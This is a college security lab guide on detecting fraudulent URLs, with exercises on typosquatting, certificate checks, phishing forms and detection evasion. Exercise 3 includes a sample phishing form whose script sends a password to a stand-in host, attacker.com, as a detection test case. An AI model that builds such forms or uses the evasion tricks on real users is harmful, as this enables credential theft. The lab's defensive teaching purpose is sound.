# 🔬 Ethical Hacking Lab Guide - URL Fraud Detection

**College Mini Project - Security Lab Experiments**

---

## Lab Objectives

By completing this lab, students will:

1. Understand phishing and typosquatting attack vectors
2. Learn URL structure and validation techniques
3. Practice threat detection algorithm development
4. Analyze security vulnerabilities in web applications
5. Implement defensive security measures

---

## Lab Exercises

### Exercise 1: URL Structure Analysis

**Objective**: Understand URL components and identify structural anomalies

**Tasks**:

1. Enter these URLs and document the detection results:

| URL | Expected Risk | Why? |
|-----|-----|-----|
| `google.com` | 0-10% | Legitimate brand, valid SSL |
| `g00gle.com` | 40-50% | Char substitution (0→o) |
| `google2.com` | 35-40% | Brand + numeric suffix |
| `googlle.com` | ? | Double letter?? |
| `google-login.com` | 20-30% | Suspicious keyword |

2. **Analysis Questions**:
   - What makes a domain structure suspicious?
   - How can typosquatting attacks fool users?
   - What is the difference between legitimate and malicious subdomains?

---

### Exercise 2: SSL Certificate Security

**Objective**: Understand certificate validation and MITM attacks

**Lab Steps**:

1. Test HTTPS URLs:
   ```
   https://google.com      (Should pass - valid cert)
   https://amazon.com      (Should pass - valid cert)
   https://self-signed.local (Self-signed - medium risk)
   ```

2. **Questions**:
   - Why is SSL certificate validation important?
   - What is a certificate mismatch attack?
   - How do MITM (Man-in-the-Middle) attacks work?
   - What's the difference between expired and invalid certs?

3. **Deep Dive**:
   ```python
   Understanding SSL/TLS Handshake:
   Client → Server: Hello (supported ciphers)
   Server → Client: Certificate + Cipher Choice
   Client: Verify cert chain
   Client ← Server: Session established
   
   Attack Point: If attacker intercepts, they can:
   - Present their own certificate
   - Decrypt traffic if user accepts warning
   ```

---

### Exercise 3: Phishing Form Detection

**Objective**: Identify phishing indicators in HTML

**Lab Activity**:

Create test HTML with various phishing indicators:

**Example 1: Legitimate Login Form**
```html
<form action="https://gmail.com/login">
    <input type="email" placeholder="Email">
    <input type="password" placeholder="Password">
    <button>Sign In</button>
</form>
```
Expected Risk: **0-10%** (Static form, no redirects, legitimate domain)

**Example 2: Phishing Form**
```html
<form action="http://fake-gmail.com">
    <p>Please verify your account immediately!</p>
    <input type="password" placeholder="Password">
    <button onclick="stealPassword()">Verify</button>
</form>
<script>
    window.location = 'http://attacker.com?pwd=...';
</script>
```
Expected Risk: **80-100%** (Domain mismatch, action words, JavaScript redirect)

---

### Exercise 4: Pattern Analysis Challenge

**Objective**: Test the detection algorithm's robustness

**Challenge Dataset**:

```
Test 1: facebook3.com
Detection: Typosquatting (Brand + numeric)
Severity: HIGH

Test 2: pay-pal-login.com
Detection: Brand name + separators + keyword
Severity: HIGH

Test 3: mail-google-login.co.uk
Detection: Multiple subdomains + brand + keyword
Severity: MEDIUM-HIGH

Test 4: google-security.com
Detection: Brand misuse... or legitimate?
Severity: MEDIUM (Ambiguous)

Test 5: accounts-amazon-verify-payment.site
Detection: Multiple red flags
Severity: CRITICAL
```

**Analysis Questions**:
- Can you find a URL that passes the filters but is still suspicious?
- What patterns could attackers use to bypass your detection?
- How would you improve detection for ambiguous cases?

---

### Exercise 5: Blacklist Management

**Objective**: Implement user threat database

**Tasks**:

1. Identify 5 suspicious URLs
2. Check each using the detector
3. Add to blacklist if suspicious (>50%)
4. Verify blacklist.txt was updated
5. Re-test URLs from blacklist (should show instant flag)

**Questions**:
- Why is user-maintained blacklist useful?
- What are the limitations?
- How would you implement collaborative threat intelligence?

---

### Exercise 6: Attack Vector Analysis

**Objective**: Understand and document attack techniques

**Attack Vector 1: Typosquatting**
```
Attack Flow:
User types: facebook.com
Attacker owns: faceb00k.com (0 instead of o)
User visits attacker's site thinking it's Facebook

Detection:
- Character substitution (0 → o)
- Visual similarity (Levenshtein distance)
- Domain behavior analysis

Defense:
- Browser warnings
- Detection algorithms
- User education
```

**Attack Vector 2: Subdomain Spoofing**
```
Attack:
www.security.bank.attacker.com
     ↑ User sees this (thinks it's bank subdomain)
              ↑ Actually attacker's domain

Detection:
- Excessive subdomains (>2 levels)
- Structural analysis
- Brand position in domain

Defense:
- URL display warnings
- Full domain highlighting
```

**Attack Vector 3: Phishing Form**
```
Attack:
1. Fake login form HTML
2. Dynamic JavaScript redirect
3. Steals credentials before redirecting

Detection:
- Form + action words + redirect
- Suspicious JavaScript patterns
- Meta refresh detection

Defense:
- HTML analysis
- JavaScript execution blocking
- Form input monitoring
```

**Attack Vector 4: Certificate Spoofing**
```
Attack:
1. Register domain for attacker
2. Get valid cert (Let's Encrypt allows this)
3. Certificate matches their domain, not victim's

Example:
attacker-domain.com with cert for attacker-domain.com
User thinks it's amazon.com but it's attacker's

Detection:
- Certificate domain mismatch
- Domain verification
- CN (Common Name) checking

Defense:
- Cert pinning
- Domain validation
- Browser warnings
```

---

## Advanced Lab Challenges

### Challenge 1: Evasion Techniques

**Objective**: Find ways to evade the detection system

**Techniques to Try**:
- Unicode characters (ｇｏｏｇｌｅ.com)
- Punycode domains (xn--...)
- Homograph attacks
- URL obfuscation

**Expected Outcome**: Document limitations, propose improvements

---

### Challenge 2: False Positive Analysis

**Objective**: Identify legitimate sites flagged as suspicious

**Task**:
```
Find domains that:
- Have numbers (e.g., web2.0 services)
- Have long subdomain chains (e.g., internal company infrastructure)
- Have multiple redirects (legitimate shorteners)
- Have JavaScript (legitimate analytics)

Question: How would you fine-tune detection to reduce false positives?
```

---

### Challenge 3: Custom Detection Algorithm

**Objective**: Implement an improved detection method

**Tasks**:
1. Analyze current detection accuracy
2. Identify gaps in current system
3. Implement new detection method (ML, heuristics, etc.)
4. Test on dataset
5. Document improvements

---

## Lab Report Template

### Section 1: Methodology
- Which exercises did you complete?
- What tools/methods did you use?
- How did you approach the analysis?

### Section 2: Findings
- Results from each exercise
- URLs tested and their scores
- Patterns you discovered
- Edge cases found

### Section 3: Analysis
- How do phishing attacks work?
- What makes domains suspicious?
- How effective is the current detection?
- What are the limitations?

### Section 4: Recommendations
- How to improve detection?
- What features to add?
- How to reduce false positives?
- Real-world applications?

### Section 5: Conclusion
- Key learnings
- Security insights
- Future research directions

---

## Security Vocabulary

| Term | Definition |
|------|-----------|
| **Phishing** | Social engineering via fake websites/emails |
| **Typosquatting** | Registering domains similar to legitimate ones |
| **MITM** | Man-in-the-Middle: Intercepting communications |
| **SSL/TLS** | Encryption protocols for secure connections |
| **Certificate** | Digital proof of website ownership |
| **Domain** | Website address (example.com) |
| **Subdomain** | Part of domain (sub.example.com) |
| **DNS** | Domain Name System (translates domains to IPs) |
| **Redirect** | Automatic forwarding to another URL |
| **Form** | User input interface (login, payments, etc.) |

---

## Ethical Guidelines

### ✅ Do:
- Use the tool for educational purposes
- Test with public domains only
- Document your findings
- Report vulnerabilities responsibly
- Follow your institution's policies

### ❌ Don't:
- Test on systems without permission
- Attempt to hack real websites
- Steal credentials or data
- Distribute malware or phishing
- Bypass security systems maliciously

---

## Real-World Applications

This project demonstrates concepts used in:

1. **Email Security** - Scanning URLs in emails
2. **Browser Protection** - Built into Chrome, Firefox, Safari
3. **Antivirus Software** - URL scanning engines
4. **Corporate Firewalls** - URL filtering
5. **DNS Protection** - Domain-based blocking
6. **API Security** - Endpoint validation

---

## Discussion Questions

1. **How would machine learning improve this system?**
2. **What data would you need for better accuracy?**
3. **How do attackers stay ahead of detection?**
4. **What's the balance between security and usability?**
5. **How would you explain this to non-technical users?**

---

## Resources for Further Learning

- OWASP Top 10 (Web security vulnerabilities)
- CWE/CVSS (Vulnerability scoring)
- RFC 3986 (URI specification)
- SSL/TLS deep dives
- Phishing campaign analysis reports
- Threat intelligence feeds

---

**Lab Completed By**: ______________  
**Date**: ______________  
**Instructor Signature**: ______________

